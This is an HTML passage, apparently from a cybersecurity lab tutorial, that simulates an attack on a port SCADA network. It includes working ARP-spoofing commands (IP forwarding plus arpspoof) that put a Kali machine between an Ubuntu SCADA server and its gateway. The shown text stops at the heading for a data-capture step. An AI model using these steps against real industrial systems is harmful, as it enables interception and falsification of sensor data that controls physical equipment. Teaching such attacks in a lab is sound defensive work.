  <div class="IB R"><div class="ibl">⚠️ Most Dangerous Scenario — Real Physical Consequences</div><p>This is the simulation that keeps cybersecurity professionals and port operators awake at night. The SCADA (Supervisory Control and Data Acquisition) system controls <strong>real physical equipment</strong> — 16-ton cranes, temperature sensors, GPS positioning, fuel gauges. When sensor data is falsified, operators see false readings and make decisions based on them. A crane operator seeing 14t on the display doesn't know the actual load is 38.5t — until equipment failure. This is why SCADA cybersecurity is classified as <strong>Critical Infrastructure Protection</strong> by governments worldwide.</p></div>
  <div class="DTL">
    <div>
      <div class="eye V" style="margin-bottom:12px;">Step A — ARP Spoofing (Man-in-the-Middle)</div>
      <h3 class="DS" style="margin-bottom:12px;">Becoming the <span class="tv">invisible middleman</span></h3>
      <p class="BM" style="margin-bottom:12px;">ARP (Address Resolution Protocol) is how devices on a local network find each other. By sending forged ARP replies, we tell the Ubuntu SCADA server that Kali Linux is the network gateway. All traffic from Ubuntu now flows through Kali first — we're in the middle of every communication. <strong>IP forwarding</strong> must be enabled so traffic continues flowing (otherwise the attack becomes visible immediately).</p>
      <pre class="CB V"><span class="CC"># Step A — Enable IP forwarding (traffic must keep flowing)</span>
<span class="CMD">echo 1</span> <span class="VAL">&gt; /proc/sys/net/ipv4/ip_forward</span>

<span class="CC"># Step A — ARP poison: tell Ubuntu that Kali IS the gateway</span>
<span class="CMD">sudo arpspoof</span> <span class="FLG">-i eth0</span> <span class="FLG">-t</span> <span class="VAL">192.168.64.2</span> <span class="VAL">192.168.64.1</span>

<span class="CC"># Result: Ubuntu's ARP cache now contains:</span>
<span class="WRN">192.168.64.1  →  08:00:27:XX:XX:XX  (Kali MAC — NOT the real gateway!)</span>
<span class="OK"># All SCADA traffic now passes through Kali before reaching destination</span></pre>

      <div class="eye V" style="margin-bottom:12px;margin-top:20px;">Step B — Capturing Live SCADA Data</div>
